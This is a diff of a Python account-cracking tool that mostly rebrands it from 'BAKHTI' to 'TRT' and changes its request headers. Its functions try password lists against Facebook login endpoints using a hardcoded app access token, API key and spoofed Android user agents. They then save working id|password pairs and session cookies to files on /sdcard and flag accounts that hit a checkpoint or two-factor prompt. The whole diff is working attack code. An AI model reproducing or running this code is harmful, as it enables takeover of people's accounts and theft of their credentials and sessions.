-                        url = 'https://m.facebook.com/login/?refsrc=deprecated&rtime=1690732822&subno_key=AaHuP6SRSTphvNZGHFS0XP3xPUXRLmsv7aWU8afQ0pbKLwJY77ASr_VkW7XEgrKbFrYYTKRE18i18menWvIdAaG1cb5sgfA4ZMNq4UfOWVEfQTPYK5wJdRc9zGsqVcm6z0QLD6-LhQKV3lhro7UOYGvtAjYuGEl6gdr5Lb17sbZQYkvOs7BfiDDxCGKlm5_6WvB53qfqPa8RRMG8XcodpXBpiRR95D6MlywnbXJC7M5JVcigZJyYzS43DjtTWtWX_Z9l5FOz1pXMotxCHolIDYonQ0ZewBkVFxWEOFLvY8Ek55O_l6lVrE6V0-2MA7qjdaE&hrc=1&wtsid=rdr_0FsbWwDqC7kfP6u6l&_rdr',
+                                "Accept-Encoding": "gzip, deflate",
+"Accept": "*/*",
+"Connection": "keep-alive",
+"User-Agent": ua,
+"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"X-FB-Friendly-Name": "authenticate",
+"X-FB-Connection-Type": "unknown",
+"Content-Type": "application/x-www-form-urlencoded",
+"X-FB-HTTP-Engine": "Liger",
+"Content-Length": "329",}
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/BAKHTI-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/BAKHTI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BAKHTI-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -835,7 +719,7 @@ def api3(ids,names,passlist):
 def api4(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BAKHTI-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -904,23 +788,23 @@ def api4(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BAKHTI-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;206m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -932,7 +816,7 @@ def api4(ids,names,passlist):
 def api5(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [BAKHTI-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -1000,47 +884,46 @@ def api5(ids,names,passlist):
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d",}
                         headers={
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
-                        url = 'https://mbasic.facebook.com/auth/login'
+                                'User-Agent': ua,
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': '25227',
+'X-FB-SIM-HNI': '29752',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Content-Length': '706'}
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/BAKHTI-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BAKHTI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[BAKHTI-2F] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/BAKHTI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -1050,7 +933,7 @@ def api5(ids,names,passlist):
                 pass
 def api6(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [BAKHTI-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1067,18 +950,18 @@ def api6(ids,names,passlist):
 			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			BAKHTI=session.cookies.get_dict().keys()
-			if "c_user" in BAKHTI:
+			TRT=session.cookies.get_dict().keys()
+			if "c_user" in TRT:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [BAKHTI-OK] %s | %s'%(ids,pas))
-				open('/sdcard/BAKHTI-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
+				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in BAKHTI:
+			elif 'checkpoint' in TRT:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BAKHTI-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1092,7 +975,7 @@ def api6(ids,names,passlist):
 #d.fb
 def api7(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [BAKHTI-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1109,18 +992,18 @@ def api7(ids,names,passlist):
 			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			BAKHTI=session.cookies.get_dict().keys()
-			if "c_user" in BAKHTI:
+			TRT=session.cookies.get_dict().keys()
+			if "c_user" in TRT:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [BAKHTI-OK] %s | %s'%(ids,pas))
-				open('/sdcard/BAKHTI-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
+				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in BAKHTI:
+			elif 'checkpoint' in TRT:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BAKHTI-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1133,7 +1016,7 @@ def api7(ids,names,passlist):
 #method7
 def api8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [BAKHTI-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1150,18 +1033,18 @@ def api8(ids,names,passlist):
 			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			BAKHTI=session.cookies.get_dict().keys()
-			if "c_user" in BAKHTI:
+			TRT=session.cookies.get_dict().keys()
+			if "c_user" in TRT:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [BAKHTI-OK] %s | %s'%(ids,pas))
-				open('/sdcard/BAKHTI-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))
+				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in BAKHTI:
+			elif 'checkpoint' in TRT:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BAKHTI-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -1172,10 +1055,10 @@ def api8(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 #method1rnd
-def lina1(ids,passlist):
+def trt1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [BAKHTI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1232,25 +1115,23 @@ def lina1(ids,passlist):
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d",}
                         headers={
-    'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'referer': 'https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjkwNzMzNDE5LCJjYWxsc2l0ZV9pZCI6NDkyNDY4Nzk4MzkxMDk5fQ%3D%3D',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
-                        url = 'https://m.facebook.com/auth/login'
+                                'User-Agent': ua,
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': '45204',
+'X-FB-SIM-HNI': '45201',
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+'Content-Length': '698'}
+                        url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -1261,8 +1142,8 @@ def lina1(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1272,8 +1153,8 @@ def lina1(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1281,12 +1162,12 @@ def lina1(ids,passlist):
         except Exception as e:
                 pass
 
-def lina2(ids,passlist):
+def trt2(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [BAKHTI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -1342,13 +1223,13 @@ def lina2(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [BAKHTI-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/BAKHTI-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				print('\r\r\033[1;32m [TRT-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/TRT-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/BAKHTI-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/TRT-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -1360,10 +1241,10 @@ def lina2(ids,passlist):
 		print(e)
 #new method
                 
-def lina3(ids,passlist):
+def trt3(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [BAKHTI-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1436,11 +1317,11 @@ def lina3(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/BAKHTI-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BAKHTI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        #open('/sdcard/TRT-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1450,8 +1331,8 @@ def lina3(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1459,10 +1340,10 @@ def lina3(ids,passlist):
         except Exception as e:
                 pass
 #method4
-def lina4(ids,passlist):
+def trt4(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [BAKHTI-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1531,11 +1412,11 @@ def lina4(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("Cookie: "+coki)
-                                        open('/sdcard/BAKHTI-COOKIE.txt','a').write(coki+'\n')
-                                        open('/sdcard/BAKHTI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
+                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1545,8 +1426,8 @@ def lina4(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1554,10 +1435,10 @@ def lina4(ids,passlist):
         except Exception as e:
                 pass
 #method5
-def lina5(ids,passlist):
+def trt5(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [BAKHTI-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1626,8 +1507,8 @@ def lina5(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [BAKHTI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1637,8 +1518,8 @@ def lina5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [BAKHTI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BAKHTI-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1646,12 +1527,12 @@ def lina5(ids,passlist):
         except Exception as e:
                 pass
 #method6
-def lina6(ids,passlist):
+def trt6(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [BAKHTI-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -1692,10 +1573,10 @@ def lina6(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [BAKHTI-2F] '+uid+' | '+pas)
+						print('\r\r\033[1;34m [TRT-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [BAKHTI-OK] '+uid+' | '+pas)
-						open('/sdcard/BAKHTI-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
+						print(f'\r\x1b[1;32m [TRT-OK] '+uid+' | '+pas)
+						open('/sdcard/TRT-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -1703,8 +1584,8 @@ def lina6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
